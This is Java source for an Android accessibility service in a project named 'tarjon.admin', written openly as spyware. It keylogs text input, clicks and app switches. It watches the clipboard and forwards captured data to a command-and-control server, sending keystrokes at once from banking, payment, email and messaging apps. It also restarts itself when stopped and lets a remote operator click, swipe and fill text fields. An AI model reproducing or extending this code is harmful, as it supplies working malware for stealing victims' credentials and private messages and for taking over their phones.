package com.tarjon.admin.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.Rect;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.tarjon.admin.db.KeyloggerDatabase;
import com.tarjon.admin.network.C2Connection;
import com.tarjon.admin.utils.EncryptionManager;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

/**
 * Accessibility service for capturing input events and performing UI automation.
 * Enables keylogging, clipboard monitoring, and simulated input operations.
 */
public class AccessibilityService extends android.accessibilityservice.AccessibilityService {

    private static final String TAG = "TarjonAccessibility";
    
    private ExecutorService executorService;
    private KeyloggerDatabase keyloggerDatabase;
    private ClipboardManager clipboardManager;
    private EncryptionManager encryptionManager;
    private C2Connection c2Connection;
    
    // Track the current app and text field focus
    private String currentApp = "";
    private String currentWindow = "";
    private String lastText = "";
    
    // Track clipboard content to detect changes
    private String lastClipboardContent = "";
    
    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Accessibility service created");
        
        executorService = Executors.newSingleThreadExecutor();
        keyloggerDatabase = new KeyloggerDatabase(this);
        clipboardManager = (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
        encryptionManager = new EncryptionManager();
        c2Connection = new C2Connection(this, encryptionManager);
        
        // Start monitoring clipboard
        startClipboardMonitoring();
    }
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            final int eventType = event.getEventType();
            
            // Extract event details
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            // Track current app and window
            if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                if (!packageName.isEmpty()) {
                    currentApp = packageName;
                }
                if (!className.isEmpty()) {
                    currentWindow = className;
                }
                
                // Log app/window change
                logActivityChange(packageName, className);
            }
            
            // Process input events
            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    processTextChange(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    processViewClick(event);
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    // Track when a view receives focus (useful for input fields)
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing accessibility event: " + e.getMessage());
        }
    }
    
    @Override
    public void onInterrupt() {
        Log.d(TAG, "Accessibility service interrupted");
    }
    
    @Override
    public void onDestroy() {
        Log.d(TAG, "Accessibility service destroyed");
        
        if (executorService != null) {
            executorService.shutdown();
        }
        
        // Try to restart the service
        Intent restartServiceIntent = new Intent(getApplicationContext(), AccessibilityService.class);
        startService(restartServiceIntent);
        
        super.onDestroy();
    }
    
    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        Log.d(TAG, "Accessibility service connected");
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED |
                AccessibilityEvent.TYPE_VIEW_CLICKED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_FOCUSED;
        
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100; // Milliseconds
        info.flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                AccessibilityServiceInfo.DEFAULT;
        
        this.setServiceInfo(info);
    }
    
    /**
     * Process text change events for keylogging
     */
    private void processTextChange(AccessibilityEvent event) {
        try {
            if (event.getText() != null && !event.getText().isEmpty()) {
                final String text = event.getText().toString();
                
                // Only log if the text has changed
                if (!text.equals(lastText)) {
                    lastText = text;
                    
                    executorService.execute(new Runnable() {
                        @Override
                        public void run() {
                            // Store in encrypted database
                            Map<String, String> data = new HashMap<>();
                            data.put("app", currentApp);
                            data.put("window", currentWindow);
                            data.put("text", text);
                            data.put("timestamp", String.valueOf(System.currentTimeMillis()));
                            
                            keyloggerDatabase.insertKeylogData(data);
                            
                            // Check if we should send data immediately (high-value apps)
                            if (isHighValueApp(currentApp)) {
                                sendKeylogData(data);
                            }
                        }
                    });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error logging text: " + e.getMessage());
        }
    }
    
    /**
     * Process view click events to track user interaction
     */
    private void processViewClick(AccessibilityEvent event) {
        try {
            if (event.getSource() != null) {
                AccessibilityNodeInfo nodeInfo = event.getSource();
                String nodeText = nodeInfo.getText() != null ? nodeInfo.getText().toString() : "";
                String nodeDesc = nodeInfo.getContentDescription() != null ? 
                        nodeInfo.getContentDescription().toString() : "";
                
                if (!nodeText.isEmpty() || !nodeDesc.isEmpty()) {
                    // Store click information
                    final Map<String, String> clickData = new HashMap<>();
                    clickData.put("app", currentApp);
                    clickData.put("window", currentWindow);
                    clickData.put("element_text", nodeText);
                    clickData.put("element_description", nodeDesc);
                    clickData.put("timestamp", String.valueOf(System.currentTimeMillis()));
                    
                    executorService.execute(new Runnable() {
                        @Override
                        public void run() {
                            keyloggerDatabase.insertClickData(clickData);
                        }
                    });
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error processing click: " + e.getMessage());
        }
    }
    
    /**
     * Log when user changes activities/windows
     */
    private void logActivityChange(final String packageName, final String className) {
        executorService.execute(new Runnable() {
            @Override
            public void run() {
                Map<String, String> activityData = new HashMap<>();
                activityData.put("package", packageName);
                activityData.put("activity", className);
                activityData.put("timestamp", String.valueOf(System.currentTimeMillis()));
                
                keyloggerDatabase.insertActivityData(activityData);
            }
        });
    }
    
    /**
     * Monitor clipboard for sensitive data
     */
    private void startClipboardMonitoring() {
        if (clipboardManager != null) {
            clipboardManager.addPrimaryClipChangedListener(new ClipboardManager.OnPrimaryClipChangedListener() {
                @Override
                public void onPrimaryClipChanged() {
                    try {
                        if (clipboardManager.hasPrimaryClip() && clipboardManager.getPrimaryClip() != null) {
                            ClipData.Item item = clipboardManager.getPrimaryClip().getItemAt(0);
                            final String clipboardText = item.getText() != null ? item.getText().toString() : "";
                            
                            if (!clipboardText.isEmpty() && !clipboardText.equals(lastClipboardContent)) {
                                lastClipboardContent = clipboardText;
                                
                                executorService.execute(new Runnable() {
                                    @Override
                                    public void run() {
                                        Map<String, String> clipboardData = new HashMap<>();
                                        clipboardData.put("app", currentApp);
                                        clipboardData.put("text", clipboardText);
                                        clipboardData.put("timestamp", String.valueOf(System.currentTimeMillis()));
                                        
                                        keyloggerDatabase.insertClipboardData(clipboardData);
                                        
                                        // Send clipboard data immediately
                                        sendClipboardData(clipboardData);
                                    }
                                });
                            }
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error monitoring clipboard: " + e.getMessage());
                    }
                }
            });
        }
    }
    
    /**
     * Check if app is high-value (banking, social media, etc.)
     */
    private boolean isHighValueApp(String packageName) {
        String[] highValueApps = {
                "com.android.vending", // Google Play
                "com.google.android.gm", // Gmail
                "com.facebook.katana", // Facebook
                "com.instagram.android", // Instagram
                "com.whatsapp", // WhatsApp
                "com.android.chrome", // Chrome
                "com.android.settings", // Settings
                "com.paypal.android.p2pmobile", // PayPal
                "com.amazon.mShop.android.shopping", // Amazon
                "com.google.android.apps.photos" // Photos
        };
        
        for (String app : highValueApps) {
            if (packageName.equals(app)) {
                return true;
            }
        }
        
        return packageName.contains("bank") || 
               packageName.contains("wallet") || 
               packageName.contains("pay") ||
               packageName.contains("secur");
    }
    
    /**
     * Send keylog data to C2 server
     */
    private void sendKeylogData(Map<String, String> data) {
        try {
            c2Connection.sendKeylogData(data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending keylog data: " + e.getMessage());
        }
    }
    
    /**
     * Send clipboard data to C2 server
     */
    private void sendClipboardData(Map<String, String> data) {
        try {
            c2Connection.sendClipboardData(data);
        } catch (Exception e) {
            Log.e(TAG, "Error sending clipboard data: " + e.getMessage());
        }
    }
    
    /**
     * Public static methods for UI automation from other components
     */
    
    /**
     * Perform a click at specific coordinates
     */
    public static boolean performClick(AccessibilityService service, int x, int y) {
        if (service == null) return false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(x, y);
            boolean result = service.dispatchGesture(
                    new GestureDescription.Builder()
                            .addStroke(new GestureDescription.StrokeDescription(path, 0, 100))
                            .build(),
                    null,
                    null
            );
            return result;
        }
        return false;
    }
    
    /**
     * Perform a swipe gesture 
     */
    public static boolean performSwipe(AccessibilityService service, int startX, int startY, int endX, int endY, int duration) {
        if (service == null) return false;
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            Path path = new Path();
            path.moveTo(startX, startY);
            path.lineTo(endX, endY);
            boolean result = service.dispatchGesture(
                    new GestureDescription.Builder()
                            .addStroke(new GestureDescription.StrokeDescription(path, 0, duration))
                            .build(),
                    null,
                    null
            );
            return result;
        }
        return false;
    }
    
    /**
     * Fill text into an editable field
     */
    public static boolean fillTextField(AccessibilityService service, String text) {
        if (service == null) return false;
        
        try {
            Bundle arguments = new Bundle();
            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
            
            AccessibilityNodeInfo rootNode = service.getRootInActiveWindow();
            if (rootNode != null) {
                List<AccessibilityNodeInfo> editableNodes = findEditableNodes(rootNode);
                
                for (AccessibilityNodeInfo node : editableNodes) {
                    if (node.isFocused() && node.isEditable()) {
                        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    }
                }
                
                // If no focused node found, try the first editable one
                if (!editableNodes.isEmpty()) {
                    AccessibilityNodeInfo node = editableNodes.get(0);
                    if (node.performAction(AccessibilityNodeInfo.ACTION_FOCUS)) {
                        return node.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments);
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error filling text field: " + e.getMessage());
        }
        
        return false;
    }
    
    /**
     * Find all editable text fields in the current window
     */
    private static List<AccessibilityNodeInfo> findEditableNodes(AccessibilityNodeInfo root) {
        List<AccessibilityNodeInfo> editableNodes = new ArrayList<>();
        
        if (root == null) return editableNodes;
        
        if (root.isEditable()) {
            editableNodes.add(root);
        }
        
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                editableNodes.addAll(findEditableNodes(child));
                child.recycle();
            }
        }
        
        return editableNodes;
    }
}
